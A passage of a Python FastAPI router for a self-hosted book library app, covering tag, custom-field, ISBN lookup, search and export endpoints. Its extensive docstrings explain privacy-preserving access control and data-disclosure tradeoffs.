import asyncio
import csv
import io
import logging
from collections.abc import Callable, Iterator
from concurrent.futures import Future, wait
from datetime import UTC, date, datetime
from typing import Annotated, Any, Final, Literal, NamedTuple, cast

from fastapi import (
    APIRouter,
    Depends,
    File,
    HTTPException,
    Query,
    Response,
    UploadFile,
    status,
)
from fastapi.responses import StreamingResponse
from pydantic import ValidationError
from sqlalchemy import func, nullslast
from sqlalchemy.orm import Session, joinedload

import authority
import book_columns
import catalogue
import catalogue_access
import cover_store
import covers
import custom_fields
import ddc
import deadline
import downloads
import folding
import google_books
import identity
import isbn as isbn_utils
import lending
import marc
import metadata
import settings_store
from auth import require_admin
from authors import AUTHOR_NAME_MAX, MATCHERS, MatcherName
from authorship import (
    AuthorNotFound,
    Authorship,
    DecisionStands,
    IdentifierConflict,
    RecordedAssertions,
)
from classifications import add_headings, bounded_headings
from dependencies import (
    BookForOwner,
    BookForRead,
    BookForWrite,
    BookInTrash,
    CurrentUser,
    DbSession,
    DivisionList,
    HeadingList,
    Paging,
    RowId,
    TagIdList,
    row_ids,
)
from dependencies import divisions as parse_divisions
from dependencies import headings as parse_headings
from enums import (
    EXPORT_MEDIA_TYPES,
    AuthorityScheme,
    BookFormat,
    BookIdentifierScheme,
    BookSort,
    BulkAction,
    ExportFormat,
    LendingWillingness,
    Locale,
    OwnershipStatus,
    ReadStatus,
    TagCategory,
)
from fields import Fields
from identifiers import add_identifiers
from lending import Loans
from logvalues import clipped
from models import (
    AUTHOR_KEY_MAX,
    ISBN_MAX,
    LOCATION_MAX,
    MAX_SERIES_INDEX,
    SERIES_NAME_MAX,
    AuthorIdentifier,
    Book,
    BookIdentifier,
    Collection,
    CustomField,
    DigitalReference,
    Note,
    Quote,
    ReadingProgress,
    Tag,
    User,
    book_tags,
    copy_group_token,
    note_visible_to,
)
from ratelimit import (
    authority_limiter,
    cover_backfill_limiter,
    export_limiter,
)
from reading import Reading
from schemas import (
    DUPLICATE_BOOKS_SHOWN,
    MAX_DIGITAL_REFERENCES_PER_BOOK,
    MAX_ROW_ID,
    MERGE_BOOKS_MAX,
    POPPED_BEFORE_THE_ASSIGNMENT,
    POPPED_BEFORE_THE_CONSTRUCTOR,
    AuthorBatchMergeOut,
    AuthorIdentifierOut,
    AuthorIdentifierRequest,
    AuthorityCandidateOut,
    AuthorityDisagreementOut,
    AuthorMergeBatchRequest,
    AuthorMergeRequest,
    AuthorOut,
    AuthorSuggestionOut,
    AuthorWikipediaOut,
    BookCreate,
    BookDetailsUpdate,
    BookDiscussUpdate,
    BookEnrichmentOut,
    BookLookup,
    BookMatch,
    BookOut,
    BookRatingUpdate,
    BookSearchOut,
    BookStatusUpdate,
    BulkRequest,
    BulkResult,
    ClassificationFacets,
    CollectionAssign,
    ConfirmedIdentifierOut,
    CopyCreate,
    CoverBackfillOut,
    CustomFieldCreate,
    CustomFieldOut,
    CustomFieldRename,
    CustomFieldValueOut,
    CustomFieldValueUpdate,
    DigitalReferenceIn,
    DigitalReferenceOut,
    DivisionFacetOut,
    DuplicateGroup,
    DuplicateMember,
    DuplicateReport,
    HeadingFacetOut,
    IdentifierBackfillOut,
    LocationOut,
    MergeRequest,
    MissingDigitalReferenceOut,
    NoteCreate,
    NoteOut,
    OwnershipUpdate,
    Page,
    PrivacyUpdate,
    ProgressCreate,
    ProgressOut,
    PurgeResult,
    QuoteCreate,
    QuoteOut,
    QuoteWithBookOut,
    RefusedAssertionOut,
    SeriesOut,
    TagCreate,
    TagOut,
)
from schemas.common import one_line
from serialisation import book_to_out, books_to_out, suggested_tag_ids
from shelf import (
    BookFilters,
    Loading,
    Shelf,
    order_for,
    whole_table_for_uniqueness,
)
from shelving import Shelving
from tags import MAX_TAGS_PER_BOOK, Mint, Naming, Vocabulary, attach
from uploads import read_image_upload

logger = logging.getLogger("endpaper.books")

router = APIRouter(prefix="/api/books", tags=["books"])


# ── Tags and lookup ───────────────────────────────────────────────────────────


@router.get("/tags", response_model=list[TagOut])
def list_tags(db: DbSession, current_user: CurrentUser) -> list[TagOut]:
    """The curated vocabulary plus the invented tags this member can already see.

    **Not every tag the library holds.** A tag carries no member of its own, so
    what decides who may be told it exists is the books carrying it: this
    answers with the seeded vocabulary, which is published in the source, plus
    every tag on a book the caller can see. An invented tag whose only books
    are other people's private ones is absent, because listing it would publish
    a name somebody typed against a book this caller may not read.

    The **client** decides the order the groups appear in (`TAG_CATEGORY_ORDER`
    in the frontend), because that is a presentation decision and it needs the
    same order in three places. This orders by name within the group so the
    response is deterministic. The order a reader sees is the client's too:
    `frontend/src/lib/nameOrder.ts` re-sorts with a collator, because no SQL
    fold moves `Ä`.

    `book_count` is one grouped query for the whole list rather than one per
    tag: this is fetched on nearly every page, so an N+1 here is an N+1
    everywhere. It is the same query the row filter reads, so the number and
    the presence of the row cannot disagree.
    """
    # `tags.Vocabulary` and not a clause here, because this route is not the
    # only reader: the lookup and the search feed the whole table into
    # `suggested_tag_ids`, which puts tag **ids** on the wire. Filtering here
    # alone would hand a client an id it could no longer name.
    vocabulary = Vocabulary.seen_by(db, current_user.id)
    counts = vocabulary.counts
    return [
        TagOut(
            id=tag.id,
            name=tag.name,
            category=TagCategory(tag.category),
            # Straight off the row: `KnownTagKey` forgets a key this version
            # has never heard of, so one costs that tag its translation rather
            # than 500ing a list drawn on nearly every page.
            key=tag.key,
            is_predefined=tag.is_predefined,
            book_count=counts.get(tag.id, 0),
        )
        for tag in vocabulary.listable()
    ]


@router.post("/tags", response_model=TagOut, status_code=status.HTTP_201_CREATED)
def create_tag(payload: TagCreate, db: DbSession, current_user: CurrentUser) -> Tag:
    """Invent a tag.

    Any member, not just an admin. Public books are a shared shelf that anyone
    may curate, and a vocabulary only an admin can extend is a vocabulary
    nobody uses.

    Matched case-insensitively against what already exists, so "Cookbooks" and
    "cookbooks" cannot both appear. A collision returns the existing tag rather
    than a 409: somebody typing a name that is already there wants that tag,
    and an error would send them to find it by hand.

    **A tag invented here is not in `GET /api/books/tags` until a book the
    caller can see carries it**, which is that route's rule and not an
    omission: a tag on no book is a name and nothing else, and publishing it to
    the whole library is the disclosure this route's two step use was part of.
    Putting it on a book is what makes it part of the vocabulary, and the
    clients do that in the same gesture.
    """
    # The fold, the order a case differing pair is resolved in, the
    # normalisation and the ceiling are `tags.py`'s, and every writer asks the
    # same Mint for them. **What stays here is the commit**, which is the one
    # thing about that module's shape that cannot move: an import needs the same
    # primitive inside a transaction it commits once, at the end of the file.
    minted = Mint(db).get_or_mint(payload.name)
    if minted is None:
        # `TagCreate.tidy` refuses a name that normalises to nothing before this
        # is reached and this Mint carries no budget, so nothing left can answer
        # None. It is handled rather than asserted because the Mint is one
        # function for two callers and the other has no schema in front of it.
        #
        # **400 and not 422**, although an empty name is what 422 is for: the
        # committed schema types a 422 `detail` as the array of validation
        # entries FastAPI sends, so a sentence under that status is read by a
        # generated client as a list. `tests/test_errors.py` holds that rule and
        # is what caught this line.
        raise HTTPException(status_code=400, detail="A tag needs a name.")

    db.commit()
    db.refresh(minted)
    return minted


@router.delete("/tags/{tag_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_tag(
    tag_id: RowId,
    db: DbSession,
    current_user: Annotated[User, Depends(require_admin)],
) -> None:
    """Remove a tag the library invented, and take it off every book.

    **Admin only, and deliberately asymmetric with creating one.** Creating a
    tag is additive and reversible by deleting it, so it is open to everyone.
    Deleting one is neither: it strips the tag from every book in the house at
    once, there is no undo for it as there is for a deleted book, and `Tag`
    records nobody as its author. One member should not be able to quietly
    unpick the shared vocabulary.

    A seeded tag is refused rather than deleted. `seed_tags()` runs at every
    boot and would put it straight back, so the delete would appear to work
    and then quietly undo itself at the next restart.

    Declared before `/{book_id}`: two segments, but the ordering is what keeps
    that true if either path is later reshaped.
    """
    tag = db.get(Tag, tag_id)
    if tag is None:
        raise HTTPException(status_code=404, detail="Tag not found")
    if tag.is_predefined:
        raise HTTPException(
            status_code=400,
            detail="That tag is part of the built-in list and cannot be removed.",
        )

    # The association rows go with it. `book_tags` has ON DELETE CASCADE, but
    # SQLite only enforces foreign keys when the pragma is on, so the rows are
    # cleared here rather than trusted to the database.
    db.execute(book_tags.delete().where(book_tags.c.tag_id == tag_id))
    db.delete(tag)
    db.commit()


# ── Custom fields ─────────────────────────────────────────────────────────────
#
# The Library's own facts about a Book, defined once here and filled in per Book
# at `/{book_id}/custom-fields` further down. Declared **before** `/{book_id}`,
# like the tag routes above and for the same reason: FastAPI matches in
# declaration order, and reversing them makes the first of these a request for
# the book with id "custom-fields".
#
# Under `/api/books` rather than under `/api/settings`, because that is where
# `/tags` already is and this is the same kind of thing: a Library wide
# vocabulary that only means anything on a Book.


def _no_such_custom_field() -> HTTPException:
    """The answer for a field that is absent, and for one this Member may not
    be told about.

    **Identical on purpose**, which is `dependencies._not_found` one level out:
    a 403 would confirm that a field at this id exists, which is exactly what
    `fields.Fields` withholds.
    """
    return HTTPException(status_code=404, detail="Custom field not found")


def _custom_field(field_id: int, db: Session, fields: Fields) -> CustomField:
    """The definition at this id, if this Member may be told it exists.

    **This is a privacy question, and this docstring said it was not.** It was
    right while every Member could list every definition: the list was the
    disclosure, so an id oracle beside it gave nothing away. Once
    `list_custom_fields` is scoped, an ungated resolver is the whole leak back,
    because the two doors it serves both answer with the field's `name`:
    renaming a guessed id to itself reads the name off the 200, and
    `PUT /{book_id}/custom-fields/{field_id}` returns the Book's whole list
    with `name` on every entry. `fields.Fields.addressable` records the rest.

    The absent id and the hidden one get the same 404, so the two cannot be
    told apart **in the body or on a clock**.

    **The gate is asked before the row is fetched, and that ordering is the
    whole of the second half.** Written the other way round, `or` short
    circuits: an absent id never reaches the three arms, so it costs **one**
    statement where a hidden id costs several, and the two answers separate on
    a timer by a factor, not a margin. Reordered, both paths issue the same
    statements and the two medians sit within 1%, interleaved, 400 repetitions
    each.

    **The hidden path's absolute statement count is deliberately not written
    here.** Two harnesses measured this question and got 4 and 5, and the claim
    does not need the number: what it needs is that the two paths were unequal
    and now are not.
    `tests/routers/test_books_custom_fields.py::TestNamingAHiddenFieldByItsId::
    test_an_absent_id_and_a_hidden_one_cost_the_same_statements` asserts the
    **equality** rather than either count, and pins the cause rather than the
    clock, because a timing assertion on a shared node is a flake.

    **The condition is unchanged and must stay so.** `field is None` is still
    what decides there is nothing to return, and the gate is a second refusal
    beside it. Collapsing the two, so the gate alone answers, would let an id
    no row carries past arm 3 and change what the door composes to.
    """
    may_be_told = fields.addressable(field_id)
    field = db.get(CustomField, field_id)
    if field is None or not may_be_told:
        raise _no_such_custom_field()
    return field


def _custom_field_out(field: CustomField, fields: Fields, is_admin: bool) -> CustomFieldOut:
    """One definition as it looks to the Member asking.

    **The two gates `rename_custom_field` applies, in the same order and from
    the same `Fields`.** `addressable` first, because an admin is not exempt
    from it: the delete is the ungated door and this one is not, so a field
    whose every value sits on Books the admin cannot see is a 404 to them and
    drawing a rename control for it would be an offer the server refuses.
    Then the admin arm, which is the route's and not the class's, for the
    reason `Fields.renamable` gives: that class is built from a viewer id and
    knows nothing about roles.

    **Written as the whole conjunction rather than leaning on `renamable`
    already asking `addressable`.** It does, so the left hand side is
    redundant for a non admin and load bearing for an admin, and spelling out
    only the half that is needed is how the admin arm would quietly widen past
    the gate it has to stay behind.

    One `Fields` across the whole list, so the cost is **constant in the number
    of definitions**: every read on that class is lazy and cached for the
    instance, so twenty five definitions issue what one does.

    **No statement count and no bound is written here, deliberately, and the
    figure in this spot has been wrong twice.** The arms differ by what carries
    a field, so there is no single figure to quote; and the only statement
    counting arm in this area pins a **parity** between two paths rather than
    this route's total, so nothing in the tree would catch a third wrong
    number. A bound stated and unarmed is the shape that stops guarding without
    ever failing.

    What is true without a number: `renamable` reaches the author read where
    `_may_be_told` short circuits on a field the viewer already has a value in,
    which is the ordinary page, so this list costs **more** than it did, and
    the increase does not grow with the vocabulary. Count it against the pre
    branch shape with an arm before quoting a bound again.
    """
    return CustomFieldOut(
        id=field.id,
        name=field.name,
        kind=field.kind,
        renamable=fields.addressable(field.id)
        and (is_admin or fields.renamable(field.id)),
    )


def _any_custom_field(field_id: int, db: Session) -> CustomField:
    """The definition at this id whoever may see it, for the admin delete alone.

    **Deliberately ungated, and named so that the gated spelling is the
    ordinary one.** `Shelving.assignable` makes the same exemption for the same
    reason: an admin has no privilege over another member's Private Books, so
    gating this would leave a field whose every value sits on those Books
    undeletable for good. Here that is sharper than it is for a collection,
    because the vocabulary has a ceiling of 25 and the delete is the only verb
    that frees a slot in it.
    """
    field = db.get(CustomField, field_id)
    if field is None:
        raise _no_such_custom_field()
    return field


@router.get("/custom-fields", response_model=list[CustomFieldOut])
def list_custom_fields(db: DbSession, current_user: CurrentUser) -> list[CustomFieldOut]:
    """Every field this library may tell you about, in the order it defined them.

    **Not every field it keeps.** A field is listed when a book you can see
    holds a value in it, when a book in your trash does, or when no book at all
    does. A field whose every value sits on books you cannot see is absent, and
    naming it by id is a 404. `fields.Fields` holds the three arms and what
    they cost.

    **No usage count**, unlike `GET /api/books/tags`. A count of the books
    carrying a field is a disclosure: it is drawn from books the caller may not
    see, so it would have to be scoped to the viewer, and a viewer scoped
    number in a confirmation dialog would then understate what deleting the
    field is about to destroy. Neither number is worth having, so the
    confirmation says "every book" instead. `docs/security.md` records it.

    **Each row says whether you may rename it.** Every field reaching this list
    is addressable to you by construction, since `listable` and `addressable`
    ask the same predicate, so what `renamable` adds is the author arm and the
    admin one. `schemas/custom_field.CustomFieldOut` records why that is a
    boolean rather than the author's member id.

    **On this list a false `renamable` is a fact about another Member**, and it
    is a disclosure rather than a convenience. The other two causes cannot
    reach here, since every listed row is addressable and an admin is never
    refused the author arm, so for a Member who is not an admin the flag reads
    exactly "somebody else defined this". Learning that used to take a rename
    request and its 403; it is now on every page load.

    **No application log records any of it, and the access log this project's
    own serving command produces records every request, so what the change
    removes is the one line that was distinctive.** A refusal on a path normal
    use never produces, carrying the field id, becomes the request every
    settings page load makes. Observability is therefore **not** unchanged, and
    a sentence saying nothing is logged reads as though it were. Nothing here
    claims anything about what a deployment's ingress keeps, which a published
    file cannot know. `docs/security.md` carries the row.
    """
    fields = Fields.seen_by(db, current_user.id)
    return [
        _custom_field_out(row, fields, current_user.is_admin)
        for row in fields.listable()
    ]


@router.post("/custom-fields", response_model=CustomFieldOut, status_code=status.HTTP_201_CREATED)
def define_custom_field(
    payload: CustomFieldCreate, db: DbSession, current_user: CurrentUser
) -> CustomFieldOut:
    """Define a field for the whole library.

    Any member, like `create_tag` and for the same reason: public books are a
    shared shelf that anyone may curate, and a vocabulary only an admin can
    extend is a vocabulary nobody uses. Defining one is additive and changes no
    book.

    A name that already exists, in any capitalisation, returns that field
    rather than a 409: somebody typing a name that is already there wants that
    field. Past `MAX_CUSTOM_FIELDS` it refuses with 409.

    **The caller is recorded as the definer**, and that is what makes two
    other things work: the field stays on their own settings page whatever
    carries it, and they may rename it. `fields.Fields` holds both. The
    collision above takes no authorship: a second member typing an existing
    name gets the row and not a stake in it.

    **So `renamable` on the answer is not always true**, and the collision is
    the case that makes it worth computing rather than asserting: a member who
    retypes somebody else's name is handed that row and may not rename it, and
    a member who retypes the name of a field hidden from them is handed a row
    they cannot address at all. Both are the open door
    `fields.Fields` records under "uniqueness is whole table of necessity";
    this reports them rather than closing them.

    **For an admin those two causes do not collide, and that is a disclosure
    rather than a symmetry.** The sentence above reads as though the collision
    kept both quiet, and it does keep them quiet for everybody else. The admin
    arm means the author half never refuses, so a false `renamable` tells an
    admin exactly one thing: a field by that name exists and every value in it
    sits on Books they cannot see. One request and no write, where the same
    conclusion used to take a define and then a rename.

    **And nothing bounds the guessing**: no rate limiter on this route, no
    counter anywhere, so a dictionary of candidate names can be walked at one
    request each. That is what makes it enumeration rather than one bit about
    a name the caller already had.

    **No application log records any of it, and the access log this project's
    own serving command produces records every request, so what the change
    removes is the one line that was distinctive.** A distinctive refusal
    becomes a request indistinguishable from a legitimate define. Nothing here
    claims anything about what a deployment's ingress keeps.
    `docs/security.md` carries the row.

    **Where the `Fields` is constructed is not load bearing**, which is worth
    saying because it reads as though it were. Autoflush puts the pending row
    in the table before any arm reads it, and the arm for a definition no Book
    carries admits it either way, so warming every cache before the commit
    answers the same. Driven both ways; nothing reds.
    """
    try:
        field = custom_fields.define(db, payload.name, payload.kind, current_user.id)
    except custom_fields.Refused as refusal:
        raise HTTPException(status_code=409, detail=str(refusal)) from refusal
    db.commit()
    db.refresh(field)
    fields = Fields.seen_by(db, current_user.id)
    return _custom_field_out(field, fields, current_user.is_admin)


@router.patch("/custom-fields/{field_id}", response_model=CustomFieldOut)
def rename_custom_field(
    field_id: RowId,
    payload: CustomFieldRename,
    db: DbSession,
    current_user: CurrentUser,
) -> CustomFieldOut:
    """Rename a field. Every value under it is kept.

    That is the schema rather than this handler: values reference the
    definition by id, so nothing about them mentions the name. `custom_fields.rename`
    records why renaming onto an existing name is refused instead of merged.

    **404 for a field you may not be told about**, which is the answer an
    absent id already gives: see `fields.Fields.addressable`.

    **403 for a field somebody else defined**, and the two refusals are
    different on purpose. The 404 withholds that a row exists; by the time
    this one can fire, `addressable` has already said it does, so saying
    whose it is adds nothing the caller did not have. `fields.Fields.renamable`
    holds the rule, including why a field with no author is renamable by
    anybody: that is every field defined before the column existed, and a
    refusal there would have taken the verb away from an entire existing
    vocabulary on the morning of the upgrade.

    **An admin may rename any field they can address**, for the reason the
    delete below is admin only: a Library wide vocabulary with a ceiling of 25
    needs somebody who can repair a name whose author is unreachable.

    **It is not the same exemption, and calling it that overstates it.** The
    delete is deliberately ungated, so it reaches a field whose every value
    sits on Books the admin cannot see; this is gated on `addressable` like
    every other id door here. So for a field hidden from every admin, the only
    verb left is the delete, which destroys every value under the row. The
    valve for a Member who has defined the whole vocabulary is therefore
    repair where the field is visible and destruction where it is not.

    **Logged, like the delete beside it.** The log line predates the author
    column and is not replaced by it: the column says who may rename, and the
    line says who did, which for an admin rename is a different person.

    **The two refusals here are the whole of what `CustomFieldOut.renamable`
    publishes**, and the client draws its control from that rather than
    deriving one. A client that has gone stale still reaches them, which is
    why the refusal is worded for a reader: hiding a control is advice and
    this is the guarantee.
    """
    # One `Fields` for both questions, which is that class's own rule: a
    # second instance here would re-issue every arm the resolver had just
    # paid for, and `renamable` asks `addressable` again by construction.
    fields = Fields.seen_by(db, current_user.id)
    field = _custom_field(field_id, db, fields)
    if not current_user.is_admin and not fields.renamable(field_id):
        raise HTTPException(
            status_code=403,
            detail="Only the member who defined this field can rename it.",
        )
    was = field.name
    try:
        custom_fields.rename(db, field, payload.name)
    except custom_fields.Refused as refusal:
        raise HTTPException(status_code=409, detail=str(refusal)) from refusal
    db.commit()
    db.refresh(field)
    logger.info(
        "Account %r renamed custom field %r to %r", current_user.username, was, field.name
    )
    # The same `Fields` the two gates above were asked of. A rename moves
    # neither authorship nor what carries the field, so nothing it cached has
    # gone stale, and a second instance would re-issue every arm.
    return _custom_field_out(field, fields, current_user.is_admin)


@router.delete("/custom-fields/{field_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_custom_field(
    field_id: RowId,
    db: DbSession,
    current_user: Annotated[User, Depends(require_admin)],
) -> None:
    """Remove a field, and its value on every book.

    **Admin only, and deliberately asymmetric with defining one**, which is the
    same split `delete_tag` makes. Defining a field is additive and reversible
    by deleting it. Deleting one destroys, in one request and with no undo,
    something every member of the house typed by hand, on books the caller
    cannot necessarily see. The row records who **defined** it, which is who
    may rename it, and that is not an owner of the content under it: the
    values were typed by everybody, so there is still nobody to ask.

    It is the sharper case of the two: deleting a tag takes a label off a book,
    and deleting a field takes the **content** a member wrote.

    **The one door taking a field id that is not scoped to the caller**, and
    deliberately: gating it would leave a field whose every value sits on books
    the admin cannot see undeletable for good. `_any_custom_field` carries the
    rest.

    204, like `delete_tag`, and the number of values removed goes to the log
    rather than to the caller. See `list_custom_fields` for why no count is
    published.
    """
    field = _any_custom_field(field_id, db)
    name = field.name
    removed = custom_fields.remove(db, field)
    db.commit()
    logger.info("Deleted custom field %r and %d value(s) under it", name, removed)


@router.get("/lookup", response_model=BookLookup)
async def lookup_isbn(
    db: DbSession,
    current_user: CurrentUser,
    isbn: Annotated[str, Query(min_length=10, max_length=ISBN_MAX)],
) -> BookLookup:
    # Validated before either upstream is called: a misread barcode would
    # otherwise cost two network round trips to learn nothing.
    #
    # **And before the budget is charged, which is the ordering `refresh_metadata`
    # already had and this route did not.** A value that reaches no catalogue must
    # not spend a Member's metadata allowance: three barcodes misread in a row
    # would otherwise leave them rate limited on the next one that was fine.
    canonical = isbn_utils.parse(isbn)
    if canonical is None:
        raise HTTPException(
            status_code=400,
            detail="Not a valid ISBN. Check the digits and try again.",
        )

    enquiry = catalogue_access.Enquiry.for_a_member_request(
        db, member=current_user.username
    )
    result = await enquiry.lookup(canonical)
    if not result.found:
        raise _lookup_failure(result)

    assert result.record is not None  # noqa: S101  narrowing, not validation
    record = result.record
    # Built here rather than left to the schema so the same objects feed the tag
    # suggestion and the response, and the two cannot disagree about what the
    # catalogues said.
    classifications = bounded_headings(record.headings)
    # The tags this caller may be told about, not the table: a suggestion is a
    # tag **id** on the wire, so an unfiltered feed here would pre-select an id
    # the list route no longer names. `tags.Vocabulary` is the one answer.
    all_tags = Vocabulary.seen_by(db, current_user.id).listable()
    return BookLookup(
        **record.as_lookup(),
        classifications=classifications,
        suggested_tag_ids=suggested_tag_ids(
            record.subject_labels, classifications, all_tags
        ),
    )


def _match_rows(
    matches: list[catalogue.Record], all_tags: list[Tag] | None
) -> list[BookMatch]:
    """Catalogue records as search rows, dropping any the schema refuses.

    **The only place a page of `BookMatch` rows is built from third party data**,
    which is the point of the function rather than a description of it. There is
    no `ValidationError` handler in `main.py`, so a record the schema refuses
    answers **500 for the whole response** wherever the model is built in a bare
    comprehension, against one dropped row here. Every endpoint answering with
    matches inherits this guard rather than that hole.

    `_bounded_match` builds the other one, from a single record, and drops the
    **field** rather than the row.

    **`title` is the one field where a record is still lost whole**, and it is
    lost before it reaches here: `metadata._merge_matches` skips a row without
    one, because a match with no title is not a candidate a member could pick.
    """
    rows: list[BookMatch] = []
    for match in matches:
        try:
            row = BookMatch(
                **match.as_match(),
                classifications=bounded_headings(match.match_headings()),
            )
        except ValidationError:
            logger.info(
                "Discarded an unusable search result from %r: %s",
                match.source,
                clipped(match),
            )
            continue
        # The record's own subjects rather than the joined string it puts on the
        # wire: splitting `categories` back apart to feed this was a round trip
        # through a separator, and the classifications come off the validated
        # model so the bounds and the tidying are not run twice.
        if all_tags is not None:
            row.suggested_tag_ids = suggested_tag_ids(
                match.subject_labels, row.classifications, all_tags
            )
        rows.append(row)
    return rows


def _bounded_match(fields: dict[str, Any]) -> BookMatch:
    """One catalogue record as a bounded match, dropping what the columns cannot hold.

    **The field rather than the record, which is the opposite of `_match_rows`
    and is deliberate.** A search page can afford to lose one row of many; an
    enrichment answer is about the book in hand, so losing it whole would answer
    "nothing found" for a book the catalogue does hold. A cleared field is a gap
    the member can see and fill; a dropped record is a question answered wrongly.
    """
    kept = dict(fields)
    for _ in range(len(kept) + 1):
        try:
            return BookMatch(**kept)
        except ValidationError as exc:
            refused = {
                str(error["loc"][0]) for error in exc.errors() if error["loc"]
            } & kept.keys()
            if not refused:
                break
            logger.info(
                "Dropped %s from a record from %s: the column cannot hold it",
                ", ".join(sorted(refused)),
                clipped(fields.get("source")),
            )
            for name in refused:
                del kept[name]

    logger.info(
        "Discarded a record from %s the schema refused whole",
        clipped(fields.get("source")),
    )
    return BookMatch.model_construct()


def _lookup_failure(result: metadata.Lookup) -> HTTPException:
    """Turn a failed lookup into the status and wording it deserves.

    All three used to be "Book not found for this ISBN", which sends someone to
    type a book in by hand when the honest answer is that a quota will reset in
    a few minutes. 503 rather than 404 for the two transient cases, so the
    client can offer "try again" instead of "add it manually".

    The fourth is `NO_SOURCES`, where nothing was asked at all because the
    library has switched off every catalogue that answers an ISBN. That is the
    same mistake one step further on: a 404 there reports a fact about the book
    from an app that asked nobody.

    **Here rather than in `catalogue_access`, and the split is the outcome
    set.** Three of these four are about what a catalogue answered, which is
    this handler's business. Only `NO_SOURCES` is about whether this Library may
    ask, so only that arm defers, and it defers to the sentence rather than
    re-deciding the status.
    """
    if result.outcome is metadata.Outcome.RATE_LIMITED:
        return HTTPException(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
            detail=(
                "The book catalogues are rate limiting us right now. Wait a minute "
                "and scan again, or add the book by hand."
            ),
        )
    if result.outcome is metadata.Outcome.UNAVAILABLE:
        return HTTPException(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
            detail=(
                "Could not reach the book catalogues. Check the connection, or add "
                "the book by hand."
            ),
        )
    if result.outcome is metadata.Outcome.NO_SOURCES:
        return catalogue_access.nothing_answers_an_isbn()
    return HTTPException(
        status_code=status.HTTP_404_NOT_FOUND,
        detail="No catalogue has a record for this ISBN.",
    )


@router.get("/search", response_model=BookSearchOut)
async def search_books(
    db: DbSession,
    current_user: CurrentUser,
    q: Annotated[str, Query(min_length=2, max_length=200, description="Title, author or both")],
    limit: Annotated[int, Query(ge=1, le=20)] = 10,
    lang: Annotated[
        Locale | None,
        Query(description="Prefer editions in this language when ranking"),
    ] = None,
    harder: Annotated[
        bool,
        Query(
            description=(
                "Also ask the catalogues too slow for the ordinary deadline. "
                "Ignored when there are none to ask."
            )
        ),
    ] = False,
) -> BookSearchOut:
    """Free-text search, for adding a book nobody can scan.

    The barcode path covers a book that is physically to hand. This covers the
    rest: a book with no barcode, a damaged one, one printed before ISBNs
    existed, or one being added from a list rather than from the shelf. The
    caller picks a result and the client prefills the form from it, so nothing
    is written until a person confirms.

    **No API key is required.** This used to be Google Books only and was
    hidden entirely from a library that had not configured one, which left
    them with no way at all to add a book by title. Open Library answers
    without a key; Google is merged in on top when one is set, for the blurb
    and the categories its search index carries and Open Library's does not.

    Two segments (`/google/search`) used to guard against this being confused
    with `/{book_id}`; a single one is safe for the same reason `/export` is,
    which is that it is declared first.

    **`harder` also asks the catalogues the ordinary deadline cannot wait for.**
    It is a request rather than an instruction: the server runs the ordinary
    search when this library has no such catalogue enabled, and when the one
    long fan out allowed at a time is already in flight. `asked` and `unasked`
    on the response say what actually happened, so a client never has to infer
    it from what it sent.
    """
    # `lang` is the reader's own language, so a German library searching a
    # German title gets the German printing first. It breaks ties only: an
    # English title still returns the English book.
    found = await catalogue_access.Enquiry.for_a_member_request(
        db, member=current_user.username
    ).title_search(q, limit=limit, prefer_language=lang, harder=harder)

    # Both read off what the fan out did rather than off `harder`, which is only
    # what the reader wanted: a harder search runs the ordinary one when the two
    # rosters are equal and when the long slot is taken. `unasked` is computed in
    # `metadata` rather than here, because a query with no usable terms asked
    # nothing and has nothing left to ask, and subtracting `asked` from the
    # roster here cannot tell that from a library whose catalogues are all slow.
    return BookSearchOut(
        matches=_match_rows(
            found.matches, Vocabulary.seen_by(db, current_user.id).listable()
        ),
        asked=list(found.asked),
        unasked=list(found.unasked),
    )


# ── Export ────────────────────────────────────────────────────────────────────
#
# Declared before /{book_id}: FastAPI matches in declaration order, so the
# reverse order would make this a request for the book with id "export".


#: The file extension each export format is saved under.
#:
#: `marcxml` is the value on the wire and `.xml` is what the file is called: a
#: cataloguer's tools open `.xml`, and `.marcxml` is an extension nothing is
#: registered for. Every other format is named after itself.
_EXPORT_EXTENSIONS: Final[dict[ExportFormat, str]] = {ExportFormat.MARCXML: "xml"}


def _export_pages(db: Session, viewer_id: int, load: Loading) -> Iterator[list[Book]]:
    """This viewer's whole shelf, in pages a writer can serialise and drop.

    **Every arm of `export_books` walks the shelf through this**, so the peak
    is one page of rows whatever format was asked for, and everything below
    is a guarantee all three arms hold rather than the MARCXML arm's.
    `tests/routers/test_books.py::TestNoExportArmResolvesMoreBooksThanAPage`
    drives every member of `ExportFormat` against it.

    **Every page is a fresh `Shelf.seen_by`**, so the privacy rule is applied
    by construction on each one rather than once on a list that is then sliced.
    A book made private while this runs is gone from every later page, which
    `tests/routers/test_books.py::TestNoExportArmResolvesMoreBooksThanAPage::test_a_book_made_private_ahead_of_the_walk_is_in_no_page`
    is the only arm anywhere to observe: every other one walks a shelf with
    nothing hidden from it, so it cannot tell a walk of the shelf from a walk
    of the table.

    **What applies the rule per page is the fresh execution, not the fresh
    construction, and the difference was measured rather than reasoned.**
    `visible_to` rides in the query's own SQL, so hoisting this call above the
    loop and reusing the object narrows and re-executes exactly the same
    statement: that mutation survived the whole of `test_books.py`. The
    contrast that is real is the one this sentence draws with a list resolved
    once and sliced, and a walk built that way fails the arm above **and**
    three book counting arms. The call stays inside the loop because that is
    what makes the re-execution legible, not because moving it would leak.

    **Walked by `Book.id`, which is unique and immutable, and both of those
    are load bearing.** An export is many reads where it used to be one, so
    the shelf moves underneath it, and what decides whether that is visible is
    the key the walk resumes on:

    * An **offset** counts from the start of a list that has moved. A row
      deleted behind the cursor pulls every later row back one, so the offset
      lands a place past where it left off and the book in between is in no
      page at all.
    * A **mutable** key loses the same book a second way. `PATCH
      /api/books/{book_id}` can retitle a book, so a walk resuming on the
      title writes a book twice when it is retitled behind the cursor and not
      at all when it is retitled ahead of it.

    Both are silent, both answer 200, and a short export that nobody can
    notice is what `docs/decisions.md` refuses under §An oversized MARC file
    is refused. A primary key can do neither: a row that existed when the
    export began and still exists is written exactly once.

    **So every file this route writes is in catalogued order**, which the
    MARCXML arm always was and the CSV and txt arms were not: they sorted by
    title. Sorting by a key and paging on it are the same walk, so keeping
    title order here would be keeping the second bullet above, and
    `tests/routers/test_imports_marc.py::TestTheExportIsPagedRatherThanWhole`
    has the arm that shows what it costs. A spreadsheet sorts a column back in
    one click; a book in no page at all is invisible.

    **No count, which is `Shelf.limited` rather than `Shelf.page`.** The
